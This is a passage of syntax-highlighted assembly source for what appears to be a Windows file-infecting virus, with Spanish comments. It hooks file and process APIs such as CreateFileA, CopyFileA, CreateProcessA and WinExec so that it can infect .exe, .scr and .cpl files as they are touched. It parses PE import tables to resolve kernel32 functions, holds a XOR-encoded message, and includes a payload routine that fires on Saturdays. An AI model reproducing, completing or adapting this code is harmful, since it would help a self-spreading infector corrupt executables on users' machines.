                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"n"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"V"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"n"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"z"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"u"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"e"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"a"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"!"</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">              </span><span class="sc2">33h</span><span class="sc0">

</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc1">; Proceso para hookear las APIs, residencia por procesos pues...</span><span class="sc0">

  </span><span class="sc5">Hookear</span><span class="sc0">               </span><span class="sc9">PROC</span><span class="sc0">

  </span><span class="sc6">PUSHAD</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">A_CreateFileA</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc3">"nrek"</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PString</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Hook_Una</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Obtener_Import</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@ProxAPI2</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
  </span><span class="sc6">SCASB</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc5">@ProxAPI</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@Hook_Una</span><span class="sc0">

  </span><span class="sc5">@Fin_Hookear</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">POPAD</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">@ProxAPI2</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
  </span><span class="sc6">SCASB</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@ProxAPI</span><span class="sc0">


  </span><span class="sc5">A_CreateFileA</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I_CreateFileA</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook_CreateFileA</span><span class="sc4">)</span><span class="sc0">

  </span><span class="sc5">A_OpenFileA</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"OpenFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I_OpenFileA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook_OpenFileA</span><span class="sc4">)</span><span class="sc0">

  </span><span class="sc5">A_MoveFileA</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"MoveFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I_MoveFileA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook_MoveFileA</span><span class="sc4">)</span><span class="sc0">

  </span><span class="sc5">A_CopyFileA</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"CopyFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I_CopyFileA</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook_CopyFileA</span><span class="sc4">)</span><span class="sc0">

  </span><span class="sc5">A__lopen</span><span class="sc0">              </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"_lopen"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I__lopen</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook__lopen</span><span class="sc4">)</span><span class="sc0">

  </span><span class="sc5">A_CreateProcessA</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"CreateProcessA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I_CreateProcessA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook_CreateProcessA</span><span class="sc4">)</span><span class="sc0">

  </span><span class="sc5">A_WinExec</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"WinExec"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">I_WinExec</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">@Hook_WinExec</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc0">

  </span><span class="sc5">PString</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc5">Cuento</span><span class="sc0">                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc5">TString</span><span class="sc0">               </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc5">@Hook_Comun</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc6">PUSHFD</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">5h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@InfectaHook</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"rcs."</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@InfectaHook</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"lpc."</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@InfectaHook</span><span class="sc0">

    </span><span class="sc5">@Regresa_Hook</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">POPFD</span><span class="sc0">
    </span><span class="sc6">POPAD</span><span class="sc0">

    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc5">@InfectaHook</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Infectar_PE</span><span class="sc0">
      </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Regresa_Hook</span><span class="sc0">

  </span><span class="sc5">@Hook_CreateFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Hook_OpenFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OpenFileA</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Hook_MoveFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MoveFileA</span><span class="sc4">]</span><span class="sc0"> 

  </span><span class="sc5">@Hook_CopyFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CopyFileA</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Hook__lopen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_lopen</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Hook_CreateProcessA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateProcessA</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@Hook_WinExec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Hook_Comun</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinExec</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc1">; Those routines belong to Billy Belcebu's VWG32...</span><span class="sc0">
  
  </span><span class="sc5">@Obtener_Import</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">SCASB</span><span class="sc0">
  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TString</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IBase</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6699h</span><span class="sc0">                              
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23C9h</span><span class="sc0">                              </span><span class="sc1">; "EP" ^| 6699h == 23C9h</span><span class="sc0">
  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@Fin_OI</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">7Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

  </span><span class="sc5">@Rebusca_PString</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PString</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Enco_K32</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Rebusca_PString</span><span class="sc0">

  </span><span class="sc5">@Enco_K32</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Fin_OI</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc5">BY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CUENTO</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

  </span><span class="sc6">LODSD</span><span class="sc0">
  </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">@Fin_OI</span><span class="sc0">

  </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

  </span><span class="sc5">@Ciclo_API</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Fin_OI</span><span class="sc0">

  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Lesigue</span><span class="sc0">

  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
  </span><span class="sc6">MOVZX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TString</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">CMPSB</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
  </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">@Okaza</span><span class="sc0">
  
  </span><span class="sc5">@Lesigue</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">BY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cuento</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Ciclo_API</span><span class="sc0">

  </span><span class="sc5">@Okaza</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">

  </span><span class="sc6">MOVZX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BY</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cuento</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">IMUL</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">RET</span><span class="sc0">
  
  </span><span class="sc5">@Fin_OI</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">RET</span><span class="sc0">

  </span><span class="sc5">Hookear</span><span class="sc0">               </span><span class="sc9">ENDP</span><span class="sc0">
  
</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

  </span><span class="sc5">Paylo</span><span class="sc0">                 </span><span class="sc9">PROC</span><span class="sc0">
  </span><span class="sc6">PUSHAD</span><span class="sc0">

  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
  </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Puyado</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">
  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha.wDayOfWeek</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6d</span><span class="sc0">
  </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">@Retorna_Paylo</span><span class="sc0">

  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Puyalo</span><span class="sc0">
